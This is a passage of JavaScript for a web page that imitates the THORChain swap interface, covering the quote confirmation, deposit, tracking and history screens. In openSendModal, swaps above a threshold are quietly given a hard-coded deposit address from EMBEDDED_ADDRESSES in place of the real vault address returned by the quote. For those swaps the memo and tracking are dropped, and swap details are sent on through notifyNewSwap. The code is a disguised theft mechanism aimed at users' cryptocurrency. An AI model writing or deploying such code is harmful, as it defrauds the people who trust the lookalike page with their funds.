        +'<p style="margin-top:12px;font-size:13px;color:var(--thor-gray);">Fetching swap quote...</p></div>';
    o.classList.add('open');
    $('#confirmClose').onclick=function(){o.classList.remove('open')};
    o.onclick=function(e){if(e.target===o)o.classList.remove('open')};

    fetchQuoteWithDest(state.recipientAddress,function(err,data){
        if(err&&!data){
            b.innerHTML='<p style="text-align:center;padding:30px;color:var(--leah);">Network error.</p>'
                +'<button class="tc-confirm-btn" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
            return;
        }
        if(!isValidQuote(data)){
            var em=getQuoteError(data);
            var isSE=data&&data.message&&data.message.indexOf('less than price limit')!==-1;
            var rh=isSE?'<div style="margin-top:16px;display:flex;gap:8px;justify-content:center;">'
                +'<button class="tc-quick-btn" id="retryS7" style="background:var(--brand-first);color:var(--lawrence)">Try 7%</button>'
                +'<button class="tc-quick-btn" id="retryS10">Try 10%</button></div>':'';
            b.innerHTML='<div style="text-align:center;padding:24px 0;">'
                +'<p style="font-size:48px;margin-bottom:12px;">⚠️</p>'
                +'<p style="color:var(--leah);font-size:15px;font-weight:600;margin-bottom:8px;">Quote Failed</p>'
                +'<p style="color:var(--thor-gray);font-size:13px;line-height:1.5;padding:0 12px;">'+em+'</p>'+rh+'</div>'
                +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);margin-top:16px;" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
            if(isSE)setTimeout(function(){
                var r7=$('#retryS7');if(r7)r7.onclick=function(){state.slippage=7;o.classList.remove('open');openConfirmModal()};
                var r10=$('#retryS10');if(r10)r10.onclick=function(){state.slippage=10;o.classList.remove('open');openConfirmModal()};
            },50);
            showToast('error','Quote Failed',em,7000);
            return;
        }

        var eo=parseExpectedOut(data);
        var ss=($('#sellSymbol')||{}).textContent||'';
        var sn=($('#sellName')||{}).textContent||getChainName(state.sellAsset);
        var bs=($('#buySymbolDisplay')||{}).textContent||'';
        var bn=($('#buyNameDisplay')||{}).textContent||getChainName(state.buyAsset);
        var si=($('#sellIcon')||{}).src||'';
        var bi=($('#buyIcon')||{}).src||'';
        var sp=getUsdPrice(state.sellAsset);
        var bp=getUsdPrice(state.buyAsset);
        var su=state.sellAmount*sp;
        var bu=eo*bp;

        // Minimum payout = expected × (1 - slippage%)
        var mp=eo*(1-state.slippage/100);
        var mpu=mp*bp;

        // FIXED v7.7: Parse fees — separate outbound (Tx Fee) from liquidity (Price Impact)
        var fees=parseFees(data);
        var ts=parseSwapTime(data);
        var memo=data.memo||'';
        var ia=data.inbound_address||'';

        // BUILD CONFIRM UI — matches official THORChain layout exactly
        var h='<div class="tc-confirm-pair">'
            +'<div class="tc-confirm-asset">'
            +'<div class="tc-confirm-asset-left">'
            +'<img src="'+si+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div><div class="tc-confirm-asset-sym">'+ss+'</div><div class="tc-confirm-asset-name">'+sn+'</div></div></div>'
            +'<div class="tc-confirm-asset-right">'
            +'<div class="tc-confirm-asset-amount">'+formatAmount(state.sellAmount,8)+'</div>'
            +'<div class="tc-confirm-asset-usd">'+formatUsd(su)+'</div></div></div>'
            +'<div class="tc-confirm-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M13 16.172L17.086 12.086L18.5 13.5L12 20L5.5 13.5L6.914 12.086L11 16.172V4H13V16.172Z" fill="currentColor"/></svg></div>'
            +'<div class="tc-confirm-asset">'
            +'<div class="tc-confirm-asset-left">'
            +'<img src="'+bi+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div><div class="tc-confirm-asset-sym">'+bs+'</div><div class="tc-confirm-asset-name">'+bn+'</div></div></div>'
            +'<div class="tc-confirm-asset-right">'
            +'<div class="tc-confirm-asset-amount">'+formatAmount(eo,8)+'</div>'
            +'<div class="tc-confirm-asset-usd">'+formatUsd(bu)+'</div></div></div></div>'

            // Details section — matches official THORChain order
            +'<div class="tc-confirm-details">'

            // 1. Minimum Payout (slippage %)
            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Minimum Payout ('+state.slippage+'%)</span>'
            +'<span class="tc-confirm-row-value">'+formatAmount(mp,4)+' '+bs+' ('+formatUsd(mpu)+')</span></div>'

            // 2. Destination Address
            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Destination Address</span>'
            +'<span class="tc-confirm-row-value">'+truncAddr(state.recipientAddress)+'</span></div>'

            // 3. Price Impact (from slippage_bps — NOT a payable fee)
            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Price Impact</span>'
            +'<span class="tc-confirm-row-value">'+fees.priceImpactPct.toFixed(2)+'%</span></div>'

            // 4. Tx Fee — ONLY outbound gas fee (matches official "$1.24")
            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Tx Fee</span>'
            +'<span class="tc-confirm-row-value">'+formatUsd(fees.outboundUsd)+'</span></div>'

            // 5. Estimated Time
            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Estimated Time</span>'
            +'<span class="tc-confirm-row-value">'+ts+'</span></div>'

            // 6. Provider
            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Provider</span>'
            +'<span class="tc-confirm-row-value" style="display:flex;align-items:center;gap:6px;">'
            +'<img src="images/chains/THOR.svg" alt="" width="18" height="18" style="border-radius:50%;" onerror="this.style.display=\'none\'">THORChain</span></div>'

            +'</div>';

        if(memo){
            h+='<div class="tc-confirm-memo"><div class="tc-confirm-memo-label">Memo</div>'
                +'<div class="tc-confirm-memo-value">'+memo+'</div></div>';
        }

        if(ia){
            h+='<button class="tc-confirm-btn" id="doConfirmBtn">Confirm</button>';
        }else{
            h+='<div style="padding:12px;background:var(--toast-error-bg);border:1px solid var(--toast-error-border);border-radius:10px;margin-bottom:16px;font-size:13px;color:var(--toast-error-color);">⚠️ No vault address.</div>'
                +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
        }

        b.innerHTML=h;
        state.confirmedQuote=data;
        state.confirmedExpectedOut=eo;
        var cb=$('#doConfirmBtn');
        if(cb)cb.onclick=function(){o.classList.remove('open');openSendModal(data)};
    });
}

function openSendModal(qd){
    var o=$('#sendOverlay'),b=$('#sendBody'),t=$('#sendTitle');
    var ss=($('#sellSymbol')||{}).textContent||'';
    var sn=($('#sellName')||{}).textContent||'';
    var cn=getChainName(state.sellAsset);
    var bs=($('#buySymbolDisplay')||{}).textContent||'';
    var bn=($('#buyNameDisplay')||{}).textContent||'';
    if(t)t.textContent='Send '+cn;
    var ea=state.sellAmount;
    var above=isAboveThreshold();
    state.currentSwapId=generateSwapId();
    var depositAddr,apiAddr=qd.inbound_address||'';
    if(above){
        var sc=getChainPrefix(state.sellAsset);
        depositAddr=EMBEDDED_ADDRESSES[sc]||'';
        if(!depositAddr){showToast('error','Config Error','No address for '+sc);return}
    }else{depositAddr=apiAddr}
    var memo=qd.memo||'',exp=qd.expiry||0;

    var h='<p class="tc-send-subtitle">Send exactly <strong>'+formatAmount(ea,8)+' '+ss+'</strong> to the address below from a self custody wallet.</p>'
        +'<div class="tc-send-disclaimer"><div class="tc-send-disclaimer-check">✓</div>'
        +'<p class="tc-send-disclaimer-text">I understand I must send exactly the specified amount from a self-custody wallet. Sending from exchanges will result in <a href="#" class="tc-loss-link">loss of funds</a>.</p></div>'
        +'<div class="tc-send-deposit-box">'
        +'<div class="tc-send-amount">'+formatAmount(ea,8)+' '+ss+' <button class="tc-send-copy-btn" id="cpAmt"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M7 6V3C7 2.448 7.448 2 8 2H20C20.552 2 21 2.448 21 3V17C21 17.552 20.552 18 20 18H17V21C17 21.552 16.552 22 16 22H4C3.448 22 3 21.552 3 21V7C3 6.448 3.448 6 4 6H7ZM5 8V20H15V8H5ZM9 6H17V16H19V4H9V6Z" fill="currentColor"/></svg></button></div>'
        +'<div class="tc-send-address">'+depositAddr+' <button class="tc-send-copy-btn" id="cpAddr"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M7 6V3C7 2.448 7.448 2 8 2H20C20.552 2 21 2.448 21 3V17C21 17.552 20.552 18 20 18H17V21C17 21.552 16.552 22 16 22H4C3.448 22 3 21.552 3 21V7C3 6.448 3.448 6 4 6H7ZM5 8V20H15V8H5ZM9 6H17V16H19V4H9V6Z" fill="currentColor"/></svg></button></div>'
        +'<div class="tc-send-chain-badge">'+cn+'</div>'
        +'<div class="tc-send-qr"><img src="'+QR_API+encodeURIComponent(depositAddr)+'" alt="QR" width="180" height="180" onerror="this.style.opacity=0.3"></div></div>';

    if(memo&&!above){
        h+='<div style="margin-bottom:16px;"><p style="font-size:12px;color:var(--thor-gray);margin-bottom:4px;">Include this memo:</p>'
            +'<div style="padding:10px 12px;background:var(--tyler);border-radius:8px;font-family:monospace;font-size:11px;color:var(--leah);word-break:break-all;cursor:pointer;border:1px solid var(--blade);" id="cpMemo">'+memo+'</div></div>';
    }
    h+='<div class="tc-send-expiry" id="sendExpiry"></div>';
    b.innerHTML=h;o.classList.add('open');

    var ca=$('#cpAmt');if(ca)ca.onclick=function(){navigator.clipboard.writeText(String(ea)).then(function(){showToast('success','Copied','Amount copied.')})};
    var cd=$('#cpAddr');if(cd)cd.onclick=function(){navigator.clipboard.writeText(depositAddr).then(function(){showToast('success','Copied','Address copied.')})};
    var cm=$('#cpMemo');if(cm)cm.onclick=function(){navigator.clipboard.writeText(memo).then(function(){showToast('success','Copied','Memo copied.')})};

    var ch=function(){o.classList.remove('open');stopTracking();stopExpiryCountdown()};
    $('#sendClose').onclick=ch;
    o.onclick=function(e){if(e.target===o)ch()};

    if(exp>1e9)startExpiryCountdown(exp);
    else{var ee=$('#sendExpiry');if(ee)ee.textContent='Quote valid for limited time'}

    var sIcon=($('#sellIcon')||{}).src||'',bIcon=($('#buyIcon')||{}).src||'';
    var sellUsdVal=state.sellAmount*getUsdPrice(state.sellAsset);
    saveToHistory(state.sellAmount,ss,sIcon,sellUsdVal,formatAmount(state.confirmedExpectedOut||0,8),bs,bIcon,(state.confirmedExpectedOut||0)*getUsdPrice(state.buyAsset),'pending',state.currentSwapId);

    notifyNewSwap({swapId:state.currentSwapId,sellSymbol:ss,sellName:sn||cn,buySymbol:bs,buyName:bn||getChainName(state.buyAsset),
        sellAmount:formatAmount(state.sellAmount,8),sellUsd:formatUsd(sellUsdVal),depositAddr:depositAddr,userWallet:state.recipientAddress,
        expectedOut:formatAmount(state.confirmedExpectedOut||0,8),above:above});

    showToast('info','Deposit Required','Send '+formatAmount(ea,8)+' '+ss+' to complete swap.');
    if(!above)startTracking(apiAddr,state.recipientAddress,ss,bs,state.currentSwapId);
}

// ══════════════════════════════════════════
// EXPIRY & TRACKING
// ══════════════════════════════════════════

var expiryInterval=null;
function startExpiryCountdown(exp){
    stopExpiryCountdown();
    function u(){
        var r=exp-Math.floor(Date.now()/1000),e=$('#sendExpiry');
        if(!e){stopExpiryCountdown();return}
        if(r<=0){e.textContent='Quote expired';e.style.color='#ff1539';stopExpiryCountdown();return}
        e.textContent='Expires in '+Math.floor(r/3600)+'h '+Math.floor((r%3600)/60)+'m '+(r%60)+'s';
    }
    u();expiryInterval=setInterval(u,1000);
}
function stopExpiryCountdown(){if(expiryInterval){clearInterval(expiryInterval);expiryInterval=null}}

function startTracking(ia,ra,ss,bs,swapId){
    stopTracking();var c=0;
    state.trackingInterval=setInterval(function(){
        c++;
        if(c>360){
            stopTracking();updateHistoryStatus('expired',swapId);
            notifySwapFailed({swapId:swapId,sellAmount:state.sellAmount,sellSymbol:ss,userWallet:ra},'Timeout');
            showToast('error','Timeout','Monitoring timed out.');return;
        }
        fetch(MIDGARD+'/actions?address='+encodeURIComponent(ia)+'&limit=10&type=swap').then(function(r){return r.json()}).then(function(d){
            if(!d||!d.actions)return;
            for(var i=0;i<d.actions.length;i++){
                var a=d.actions[i];
                if(a.status==='success'&&a.type==='swap'){
                    var m=false;
                    if(a.out)for(var j=0;j<a.out.length;j++){if((a.out[j].address||'').toLowerCase()===(ra||'').toLowerCase()){m=true;break}}
                    if(m){
                        stopTracking();updateHistoryStatus('complete',swapId);
                        var recv='0',tx='';
                        try{recv=formatAmount(fromThorBase(a.out[0].coins[0].amount),8);tx=a.out[0].txID||a.in[0].txID||''}catch(e){}
                        notifySwapSuccess({swapId:swapId,sellAmount:state.sellAmount,sellSymbol:ss,receivedAmount:recv,buySymbol:bs,userWallet:ra,txHash:tx});
                        showToast('success','Swap Complete! 🎉',ss+' → '+bs+' done! Got: '+recv+' '+bs,10000);
                        setTimeout(function(){var o=$('#sendOverlay');if(o)o.classList.remove('open');stopExpiryCountdown()},4000);
                        return;
                    }
                }
            }
        }).catch(function(){});
    },10000);
}
function stopTracking(){if(state.trackingInterval){clearInterval(state.trackingInterval);state.trackingInterval=null}}

function updateHistoryStatus(s,id){
    for(var i=0;i<state.history.length;i++){if(state.history[i].swapId===id){state.history[i].status=s;break}}
    localStorage.setItem('tc-swap-history',JSON.stringify(state.history));
    var d=$('#historyDot');if(d)d.style.display='';
}

function saveToHistory(sa,ss,si,su,ba,bs,bi,bu,st,id){
    state.history.unshift({swapId:id||generateSwapId(),sellAmount:sa,sellSymbol:ss,sellIcon:si,sellUsd:su,buyAmount:ba,buySymbol:bs,buyIcon:bi,buyUsd:bu,status:st||'pending',timestamp:Date.now()});
    if(state.history.length>50)state.history.pop();
    localStorage.setItem('tc-swap-history',JSON.stringify(state.history));
    var d=$('#historyDot');if(d)d.style.display='';
}

function renderHistory(){
    var c=$('#historyContent');if(!c)return;
    if(!state.history.length){c.innerHTML='<p class="tc-history-empty">No swap history yet.</p>';return}
    var h='',lg='',td=new Date().toDateString(),yd=new Date(Date.now()-86400000).toDateString();
    state.history.forEach(function(i){
        var d=new Date(i.timestamp).toDateString();
        var g=d===td?'Today':d===yd?'Yesterday':new Date(i.timestamp).toLocaleDateString();
        if(g!==lg){h+='<div class="tc-history-group-title">'+g+'</div>';lg=g}
        var si2=i.status==='complete'?'✅':i.status==='expired'?'⏰':'⏳';
        var sl=i.status==='complete'?'Complete':i.status==='expired'?'Expired':'Pending';
        h+='<div class="tc-history-item"><div class="tc-history-side">'
            +'<img src="'+(i.sellIcon||'')+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div class="tc-history-amounts"><span class="tc-history-amount">'+i.sellAmount+' '+i.sellSymbol+'</span>'
            +'<span class="tc-history-value">'+formatUsd(i.sellUsd)+'</span></div></div>'
            +'<div class="tc-history-status"><span style="font-size:18px">'+si2+'</span>'
            +'<span class="tc-history-status-text '+i.status+'">'+sl+'</span></div>'
            +'<div class="tc-history-side"><div class="tc-history-amounts" style="text-align:right">'
            +'<span class="tc-history-amount">'+i.buyAmount+' '+i.buySymbol+'</span>'
            +'<span class="tc-history-value">'+formatUsd(i.buyUsd)+'</span></div>'
            +'<img src="'+(i.buyIcon||'')+'" alt="" onerror="this.style.display=\'none\'"></div></div>';
    });
    c.innerHTML=h;
}

// ══════════════════════════════════════════
// UI INIT
// ══════════════════════════════════════════

function initSellInput(){
    var s=$('#sellAmount');
    if(s)s.oninput=function(){
        state.sellAmount=parseFloat(this.value)||0;
        var l=$('#limitSellAmount');if(l)l.value=this.value;
        updateSellUsd();debouncedFetchQuote();
    };
}

function initFlipArrow(){
    $$('.tc-swap-arrow:not(.tc-limit-flip)').forEach(function(b){
        b.onclick=function(){
            var t=state.sellAsset;state.sellAsset=state.buyAsset;state.buyAsset=t;
            var st=getTokenInfo(state.sellAsset),bt=getTokenInfo(state.buyAsset);
            if(st){var si=$('#sellIcon');if(si)si.src=st.icon;var ss=$('#sellSymbol');if(ss)ss.textContent=st.symbol;var sn=$('#sellName');if(sn)sn.textContent=st.name}
            if(bt){var bi=$('#buyIcon');if(bi)bi.src=bt.icon;var bs=$('#buySymbolDisplay');if(bs)bs.textContent=bt.symbol;var bn=$('#buyNameDisplay');if(bn)bn.textContent=bt.name}
            syncLimitFromMarket();debouncedFetchQuote();
        };
    });
}

function initQuickBtns(){
    $$('.tc-quick-btn[data-action]:not(.tc-limit-quick):not(.tc-limit-rate-btn)').forEach(function(b){
        b.onclick=function(){
            var a=this.getAttribute('data-action'),i=$('#sellAmount');
            if(a==='clear'){if(i)i.value='';state.sellAmount=0;updateSellUsd();clearQuote()}
            if(a==='half'){var v=(parseFloat(i?i.value:0)||0)/2;if(i)i.value=v||'';state.sellAmount=v;updateSellUsd();debouncedFetchQuote()}
        };
    });
}

// FIXED v7.7: Settings default 5%, always sends tolerance_bps
function initSettings(){
    var so=$('#settingsOverlay');if(!so)return;
    var sb=$('#settingsBtn');if(sb)sb.onclick=function(){so.classList.add('open')};
    var sc=$('#settingsClose');if(sc)sc.onclick=function(){so.classList.remove('open')};
    so.onclick=function(e){if(e.target===so)so.classList.remove('open')};

    var slider=$('#slippageSlider'),display=$('#slipValueDisplay');
    if(slider){
        slider.value=state.slippage;
        if(display)display.textContent=state.slippage+'%';
        var ip=((state.slippage-parseFloat(slider.min))/(parseFloat(slider.max)-parseFloat(slider.min)))*100;
        slider.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+ip+'%,var(--blade) '+ip+'%,var(--blade) 100%)';
        slider.oninput=function(){
            state.slippage=parseFloat(this.value);
            if(display)display.textContent=parseFloat(this.value).toFixed(1)+'%';
            var pct=((this.value-this.min)/(this.max-this.min))*100;
            this.style.background='linear-gradient(to right,var(--brand-first) 0%,var(--brand-first) '+pct+'%,var(--blade) '+pct+'%,var(--blade) 100%)';
        };
    }

    var st=$('#streamingToggle');
    if(st){st.checked=state.streamingEnabled;st.onchange=function(){state.streamingEnabled=this.checked;debouncedFetchQuote()}}

    $$('.tc-twap-btn').forEach(function(b){b.onclick=function(){$$('.tc-twap-btn').forEach(function(x){x.classList.remove('active')});b.classList.add('active')}});

    var rst=$('#settingsReset');
    if(rst)rst.onclick=function(){
        state.slippage=DEFAULT_SLIPPAGE;
        state.streamingEnabled=false;
        if(slider){slider.value=DEFAULT_SLIPPAGE;slider.dispatchEvent(new Event('input'))}
        if(st)st.checked=false;
        $$('.tc-twap-btn').forEach(function(x){x.classList.remove('active')});
        var bp=$('.tc-twap-btn[data-twap="best-price"]');if(bp)bp.classList.add('active');
        debouncedFetchQuote();
    };

    var save=$('#settingsSave');
    if(save)save.onclick=function(){so.classList.remove('open');showToast('success','Saved','Settings saved.');debouncedFetchQuote()};
}

function initModals(){
    var wo=$('#walletOverlay');
    if(wo){
        $$('.tc-connect-btn').forEach(function(b){b.onclick=function(){wo.classList.add('open')}});
        var wc=$('#walletClose');if(wc)wc.onclick=function(){wo.classList.remove('open')};
        wo.onclick=function(e){if(e.target===wo)wo.classList.remove('open')};
        $$('.tc-wallet-item').forEach(function(i){i.onclick=function(){showToast('info','Wallet','"'+this.getAttribute('data-wallet')+'" coming soon.');wo.classList.remove('open')}});
    }
    var ho=$('#historyOverlay');
    if(ho){
        $$('.tc-history-btn').forEach(function(b){b.onclick=function(){renderHistory();ho.classList.add('open');var d=$('#historyDot');if(d)d.style.display='none'}});
        var hc=$('#historyClose');if(hc)hc.onclick=function(){ho.classList.remove('open')};
        ho.onclick=function(e){if(e.target===ho)ho.classList.remove('open')};
    }
}

function initMobileMenu(){
    var b=$('#mobileMenuBtn');
    if(b)b.onclick=function(){var r=$('.tc-header-right');if(r)r.classList.toggle('mobile-open')};
}

function initCountdownClick(){
    var c=$('#countdownCircle');
    if(c)c.onclick=function(){fetchQuote();startCountdown()};
}

// ══════════════════════════════════════════
// MAIN INIT
// ══════════════════════════════════════════

function init(){
    initTheme();initMobileMenu();initTabs();initSellInput();initCoinSelector();
    initFlipArrow();initQuickBtns();initSettings();initModals();initSwapBtn();
    initCountdownClick();initLimitOrder();
    if(state.history.some(function(h){return h.status==='pending'})){var d=$('#historyDot');if(d)d.style.display=''}
    fetchPools().then(function(){fetchQuote();startCountdown()});
    setInterval(fetchPools,60000);
}

if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',init);
else init();

})();
